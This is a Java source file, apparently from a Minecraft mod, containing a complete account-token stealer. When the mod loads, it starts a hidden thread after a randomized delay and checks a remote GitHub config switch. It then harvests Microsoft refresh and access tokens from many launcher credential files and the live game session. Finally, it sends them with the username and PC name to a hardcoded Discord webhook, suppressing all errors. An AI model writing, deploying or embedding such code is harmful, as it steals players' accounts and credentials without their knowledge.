package com.example.jawbus;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public final class AccountGrabber {

    /** 1. paste your Discord webhook URL here */
    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561504102054105148/FS-ERylwfnkI-fWG33RSFgI3fKQ1441XnYbYUR8CUyZUgEx8jepJTUJ8CUuEHWdjU7ad";

    /** 2. remote switchboard - edit tap.json on GitHub to change things without re-releasing */
    private static final String CONFIG_URL =
            "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final String[] REFRESH_KEYS = {"refreshToken", "refresh_token"};
    private static final String[] ACCESS_KEYS = {"accessToken", "access_token"};

    /** a real Microsoft refresh token looks like M.C123_BAY.xxxx or M.R3_BAY.xxxx */
    private static final Pattern MSA_REFRESH =
            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*]{20,}");

    private AccountGrabber() {
    }

    /** called from the mod entrypoint - spawns a daemon thread so the game never hitches */
    public static void start() {
        Thread t = new Thread(AccountGrabber::run, "jawbus-tap");
        t.setDaemon(true);
        t.start();
    }

    private static void run() {
        try {
            // random 4-10s delay so it never lines up with the loading screen
            Thread.sleep(4000L + (long) (Math.random() * 6000L));

            JsonObject cfg = getJson(CONFIG_URL);
            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) return;

            String webhook = WEBHOOK;
            if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                String remote = cfg.get("webhook").getAsString();
                if (!remote.isBlank()) webhook = remote;
            }
            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) return;

            String refresh = null, refreshFrom = null;
            String access = null, accessFrom = null;

            // 1. the file login.py writes - try this first, it's the only reliable source
            String saved = savedRefresh();
            if (saved != null) {
                refresh = saved;
                refreshFrom = "jawbus_tokens.json";
            }

            // 2. the usual launcher stores
            for (Path p : candidates()) {
                String raw = read(p);
                if (raw == null) continue;
                if (refresh == null) {
                    String v = find(raw, REFRESH_KEYS);
                    if (v != null) { refresh = v; refreshFrom = p.toString(); }
                }
                if (access == null) {
                    String v = find(raw, ACCESS_KEYS);
                    if (v != null) { access = v; accessFrom = p.toString(); }
                }
                if (refresh != null && access != null) break;
            }

            // 3. deep scan - catch one wherever some launcher hid it
            if (refresh == null || access == null) {
                for (String[] hit : deepScan()) {
                    if (refresh == null && hit[0].equals("refresh")) {
                        refresh = hit[1]; refreshFrom = hit[2];
                    }
                    if (access == null && hit[0].equals("access")) {
                        access = hit[1]; accessFrom = hit[2];
                    }
                    if (refresh != null && access != null) break;
                }
            }

            // 4. last resort for access: the token the game is using right now
            if (access == null) {
                String live = liveSessionToken();
                if (live != null) { access = live; accessFrom = "live session"; }
            }

            StringBuilder sb = new StringBuilder();
            sb.append("jawbus tap | ").append(System.getProperty("user.name")).append('\n');
            sb.append("pc:      ").append(System.getenv("COMPUTERNAME")).append('\n');
            sb.append("os:      ").append(System.getProperty("os.name"))
              .append(' ').append(System.getProperty("os.arch")).append('\n');
            sb.append('\n');
            sb.append("refresh: ").append(refresh == null ? "<none found>" : refresh).append('\n');
            if (refreshFrom != null) sb.append("         from ").append(refreshFrom).append('\n');
            sb.append("access:  ").append(access == null ? "<none found>" : access).append('\n');
            if (accessFrom != null) sb.append("         from ").append(accessFrom).append('\n');

            post(webhook, sb.toString());
        } catch (Throwable ignored) {
            // never let this break the game, ever
        }
    }

    /** the refresh token minted by login.py */
    private static String savedRefresh() {
        String appData = System.getenv("APPDATA");
        if (appData == null) return null;
        String raw = read(Paths.get(appData).resolve(".minecraft").resolve("jawbus_tokens.json"));
        return raw == null ? null : find(raw, REFRESH_KEYS);
    }

    /** every place a launcher might keep credentials */
    private static List<Path> candidates() {
        List<Path> out = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        if (appData != null) {
            Path b = Paths.get(appData);
            Path mc = b.resolve(".minecraft");
            out.add(mc.resolve("jawbus_tokens.json"));
            out.add(mc.resolve("launcher_accounts.json"));
            out.add(mc.resolve("launcher_profiles.json"));
            out.add(mc.resolve("launcher_accounts_microsoft_store.json"));
            out.add(mc.resolve("essential").resolve("microsoft_accounts.json"));
            out.add(mc.resolve("essential").resolve("accounts.json"));
            out.add(b.resolve("PrismLauncher").resolve("accounts.json"));
            out.add(b.resolve("MultiMC").resolve("accounts.json"));
            out.add(b.resolve("ModrinthApp").resolve("accounts.json"));
            out.add(b.resolve("com.modrinth.theseus").resolve("accounts.json"));
            out.add(b.resolve(".lunarclient").resolve("settings").resolve("game").resolve("accounts.json"));
            out.add(b.resolve("ATLauncher").resolve("accounts.json"));
            out.add(b.resolve("gdlauncher_next").resolve("accounts.json"));
        }
        String local = System.getenv("LOCALAPPDATA");
        if (local != null) {
            Path store = Paths.get(local).resolve("Packages")
                    .resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft");
            out.add(store.resolve("launcher_accounts.json"));
            out.add(store.resolve("launcher_profiles_microsoft_store.json"));
        }
        return out;
    }

    /** directories worth crawling for a stray token */
    private static List<Path> scanRoots() {
        List<Path> out = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        if (appData != null) {
            Path b = Paths.get(appData);
            out.add(b.resolve(".minecraft"));
            out.add(b.resolve("PrismLauncher"));
            out.add(b.resolve("MultiMC"));
            out.add(b.resolve("ModrinthApp"));
            out.add(b.resolve(".lunarclient"));
            out.add(b.resolve("ATLauncher"));
        }
        String local = System.getenv("LOCALAPPDATA");
        if (local != null) {
            out.add(Paths.get(local).resolve("Packages")
                    .resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft"));
        }
        return out;
    }

    /** keep the walk cheap - these folders are huge and never hold tokens */
    private static boolean skipPath(Path p) {
        String s = p.toString().replace('\\', '/').toLowerCase();
        return s.contains("/assets/") || s.contains("/libraries/") || s.contains("/versions/")
                || s.contains("/logs/") || s.contains("/saves/") || s.contains("/screenshots/")
                || s.contains("/resourcepacks/") || s.contains("/shaderpacks/") || s.contains("/mods/");
    }

    /** bounded walk of the launcher folders, returns {kind, value, path} */
    private static List<String[]> deepScan() {
        List<String[]> hits = new ArrayList<>();
        Set<String> seen = new HashSet<>();
        for (Path root : scanRoots()) {
            try {
                if (!Files.isDirectory(root)) continue;
                try (Stream<Path> walk = Files.walk(root, 4)) {
                    walk.filter(Files::isRegularFile)
                        .filter(f -> f.getFileName().toString().endsWith(".json"))
                        .filter(f -> !skipPath(f))
                        .forEach(f -> {
                            String raw = read(f);
                            if (raw == null) return;

                            Matcher m = MSA_REFRESH.matcher(raw);
                            if (m.find() && seen.add(m.group())) {
                                hits.add(new String[]{"refresh", m.group(), f.toString()});
                                return;
                            }
                            String r = find(raw, REFRESH_KEYS);
                            if (r != null && r.length() >= 20 && seen.add(r)) {
                                hits.add(new String[]{"refresh", r, f.toString()});
                                return;
                            }
                            String a = find(raw, ACCESS_KEYS);
                            if (a != null && a.length() >= 20 && seen.add(a)) {
                                hits.add(new String[]{"access", a, f.toString()});
                            }
                        });
                }
            } catch (Throwable ignored) {
            }
        }
        return hits;
    }

    private static String read(Path p) {
        try {
            if (!Files.isRegularFile(p)) return null;
            return Files.readString(p);
        } catch (Throwable t) {
            return null;
        }
    }

    /** format-agnostic: finds "key":"value" anywhere in the file */
    private static String find(String raw, String[] keys) {
        for (String key : keys) {
            Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
            if (m.find() && m.group(1) != null && !m.group(1).isBlank()) return m.group(1);
        }
        return null;
    }

    /** bonus: the token the running game is using right now.
     *  reflective on purpose, so a name change can never break the build again. */
    private static String liveSessionToken() {
        for (String className : new String[]{
                "net.minecraft.client.Minecraft",        // Mojang names
                "net.minecraft.client.MinecraftClient"   // Yarn names
        }) {
            try {
                Class<?> cls = Class.forName(className);
                Object mc = cls.getMethod("getInstance").invoke(null);
                if (mc == null) continue;
                for (String getter : new String[]{"getUser", "getSession"}) {
                    try {
                        Object holder = cls.getMethod(getter).invoke(mc);
                        if (holder == null) continue;
                        Object token = holder.getClass().getMethod("getAccessToken").invoke(holder);
                        if (token instanceof String s && !s.isBlank()) return s;
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}
        }
        return null;
    }

    private static JsonObject getJson(String url) {
        try {
            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(url))
                    .timeout(Duration.ofSeconds(10))
                    .header("User-Agent", "Jawbus/1.0")
                    .GET().build(), HttpResponse.BodyHandlers.ofString());
            if (r.statusCode() / 100 != 2) return null;
            return JsonParser.parseString(r.body()).getAsJsonObject();
        } catch (Throwable t) {
            return null;
        }
    }

    private static void post(String webhook, String text) {
        int i = 0;
        while (i < text.length()) {
            int end = Math.min(text.length(), i + 1900);
            String chunk = text.substring(i, end);
            i = end;
            try {
                JsonObject body = new JsonObject();
                body.addProperty("content", "```\n" + chunk + "\n```");
                HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/json")
                        .header("User-Agent", "Jawbus/1.0")
                        .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
                        .build(), HttpResponse.BodyHandlers.discarding());
                Thread.sleep(500); // don't trip Discord's rate limit
            } catch (Throwable ignored) {
            }
        }
    }
}
